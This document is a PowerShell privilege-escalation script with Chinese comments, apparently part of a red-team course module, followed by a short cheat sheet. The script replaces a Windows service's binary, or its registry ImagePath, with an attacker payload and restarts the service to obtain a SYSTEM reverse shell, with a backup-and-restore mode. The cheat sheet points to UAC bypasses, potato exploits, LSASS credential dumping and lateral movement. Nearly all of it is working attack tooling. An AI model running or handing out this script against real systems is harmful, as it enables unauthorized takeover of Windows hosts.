[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][ValidateSet("Hijack", "Restore")][string]$Action = "Hijack",
    [Parameter(Mandatory = $true)][string]$ServiceName,
    [string]$PayloadPath = "C:\Windows\Temp\svcpayload.exe",
    [switch]$UseImagePath,            # 目录不可写时改注册表 ImagePath 指向 payload
    [int]$WaitSeconds = 8
)

$ErrorActionPreference = "Stop"
$StateFile = Join-Path $env:TEMP ("m06-" + $ServiceName + "-state.txt")

function Write-Log($m) { Write-Output ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }
function Get-Svc {
    Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
}
function Split-BinPath([string]$p) {
    # PathName 可能是 "C:\Program Files\X\svc.exe" --arg；解析出纯 exe 路径
    $p = $p.Trim()
    if ($p.StartsWith('"')) { return ($p -split '"')[1] }
    return ($p -split '\s+')[0]
}

if (-not (Get-Svc)) { Write-Log "[-] 服务 $ServiceName 不存在（服务名区分大小写，sc qc 核对）"; exit 1 }

# ================= 回滚 =================
if ($Action -eq "Restore") {
    if (-not (Test-Path $StateFile)) { Write-Log "[-] 找不到状态文件 $StateFile —— 无备份可恢复，人工用当时导出的 .reg/备份 exe 恢复"; exit 1 }
    $s = Get-Content $StateFile | Out-String | ConvertFrom-StringData
    Write-Log "[+] 停止服务并恢复原二进制 $($s.OriginalPath)"
    try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[!] 停止失败：$($_.Exception.Message)（继续尝试复制）" }
    Start-Sleep -Seconds 1
    try {
        if ($s.BackupPath -and (Test-Path $s.BackupPath)) {
            Copy-Item -Path $s.BackupPath -Destination $s.OriginalPath -Force
            Write-Log "[+] 原 exe 已复制回 $($s.OriginalPath)"
        }
        if ($s.RegBackup -and (Test-Path $s.RegBackup)) {
            reg import $s.RegBackup | Out-Null
            Write-Log "[+] 注册表已从 $($s.RegBackup) 恢复"
        }
        Remove-Item $StateFile -Force
    } catch { Write-Log "[-] 回滚失败：$($_.Exception.Message)"; exit 1 }
    try { Start-Service -Name $ServiceName -ErrorAction Stop; Write-Log "[+] 服务已按原配置重新启动（验证：sc query $ServiceName 应为 RUNNING）" }
    catch { Write-Log "[!] 服务未能启动：$($_.Exception.Message)（检查 .reg 是否含 Startup 密码等）" }
    exit 0
}

# ================= 劫持 =================
$svc  = Get-Svc
$bin  = Split-BinPath $svc.PathName
Write-Log "[+] 服务: $($svc.Name) | 原二进制: $bin | 运行账户: $($svc.StartName)"
if (-not (Test-Path $bin)) { Write-Log "[-] 原二进制不存在 $bin（路径含变量？先人工确认）"; exit 1 }
if (-not (Test-Path $PayloadPath)) { Write-Log "[-] payload 不存在 $PayloadPath，先上传"; exit 1 }

$stamp = Get-Date -Format "yyyyMMdd-HHmmss"
$regBackup = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".reg")
$backupExe = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".exe")

Write-Log "[+] 保存原配置：reg export + 原 exe 备份"
reg export ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) $regBackup /y | Out-Null
Copy-Item -Path $bin -Destination $backupExe -Force
@("OriginalPath=$bin", "BackupPath=$backupExe", "RegBackup=$regBackup") | Set-Content -Path $StateFile -Encoding Ascii
Write-Log "[+] 备份: exe→$backupExe ; reg→$regBackup"

Write-Log "[+] 停止服务"
try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[-] 无法停止服务：$($_.Exception.Message)（换可停服务，或依赖重启/定时触发）"; exit 1 }

try {
    if ($UseImagePath) {
        Write-Log "[+] 改 ImagePath → $PayloadPath（目录不可写备选）"
        reg add ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) /v ImagePath /t REG_EXPAND_SZ /d $PayloadPath /f | Out-Null
    } else {
        Write-Log "[+] 替换二进制：$bin ← $PayloadPath"
        Copy-Item -Path $PayloadPath -Destination $bin -Force
    }
    Write-Log "[+] 启动服务（触发 payload）"
    Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
    Start-Sleep -Seconds $WaitSeconds
} catch {
    Write-Log "[!] 触发阶段异常：$($_.Exception.Message)（shell 可能已回连，属预期；sc start 报 1053 时 payload 副作用已发生）"
}

Write-Log "[*] 验证：攻击机监听应收到 SYSTEM shell（whoami → nt authority\system）"
Write-Log "[*] 拿到 shell 后务必回滚：-Action Restore -ServiceName $ServiceName"
Write-Log "[*] 若回滚时 exe 被占用（payload 进程还活着）：taskkill /F /IM <payload名> 后重跑 Restore"
````

## 附：本模块速查

| 判定 | 适用技术 | 脚本/工具 |
|---|---|---|
| 管理员组成员 + 中完整性 | Fodhelper / ComputerDefaults / AlwaysInstallElevated | `m06-fodhelper-uac.ps1` |
| SeImpersonate + 服务上下文 | PrintSpoofer → SigmaPotato（出网受限时）→ 老系统 JuicyPotato | `m06-sigmapotato-reflect.ps1` |
| 可写服务二进制/ImagePath | 服务二进制劫持 + 注册表备份回滚 | `m06-service-binary-payload.c` + `m06-service-hijack.ps1` |

提权后固定动作：`whoami /groups` 记录新完整性 → 如需凭据抓取见 [07-credentials-lsass](/zh/modules/07-credentials-lsass) → 横向见 [15-winrm-lateral](/zh/modules/15-winrm-lateral)。
